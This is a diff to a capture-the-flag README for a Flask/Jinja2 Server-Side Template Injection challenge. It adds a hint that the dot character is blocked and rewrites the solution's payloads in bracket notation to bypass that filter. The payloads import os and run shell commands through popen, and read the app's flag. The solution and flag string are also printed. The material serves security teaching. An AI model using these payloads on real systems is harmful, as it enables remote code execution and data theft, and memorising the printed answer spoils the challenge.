@@ -40,6 +40,7 @@ python app/app.py
 1. The messaging service doesn't properly sanitize the input.
 2. Jinja2 templates can execute Python code under certain conditions.
 3. The admin page contains the flag, but how can you access it without directly visiting the page?
+4. The application blocks the dot character ('.'), so you must use bracket notation (e.g. foo['bar']) instead of dot notation.
 
 ## Solution
 
@@ -55,8 +56,8 @@ This challenge involves a Server-Side Template Injection vulnerability.
    - `{{config}}` - To see the Flask configuration
    - `{{config.items()}}` - To see the configuration as key-value pairs
    - More advanced payloads can give you remote code execution:
-   - `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
-   - Or to directly get the flag: `{{request.application.__globals__.__builtins__.__import__('app').FLAG}}`
+   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
+   - Or to directly get the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
 
 3. The flag is: `ETHACK{es_es_ti_ai_ahayahay}`
 </details>
